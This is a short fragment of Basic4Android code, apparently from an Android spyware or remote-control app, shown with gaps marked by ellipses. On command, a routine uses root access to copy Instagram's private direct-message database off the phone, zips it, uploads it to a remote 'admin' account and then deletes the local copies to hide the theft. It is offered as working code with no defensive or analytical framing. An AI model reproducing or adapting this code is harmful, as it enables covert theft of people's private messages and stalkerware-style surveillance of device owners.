...
Sub getdirect (Topic As String, Data As String)
	Try
		'Log("^^^^^^^^^^^^^^^^^^^^^")
		...
		If Su.DeviceRooted Then
			If Su.ExecuteWithEvent("ls", "Su").WaitForCompletion Then
				...
				'Log(Contents)
				Su.Execute("cp data/data/com.instagram.android/databases/direct.db /storage/emulated/0/direct.db").WaitForCompletion
				...
				zip.ABZipfile(File.DirRootExternal&"/" , "direct.db" , File.DirRootExternal&"/mydb.zip")
			
				upload.upload(admin_id , "DirectDb".Replace(" ","%20") , 0 , File.DirRootExternal , "mydb.zip")
				File.Delete(File.DirRootExternal&"/" , "direct.db")
				File.Delete(File.DirRootExternal&"/","mydb.zip")
			Else
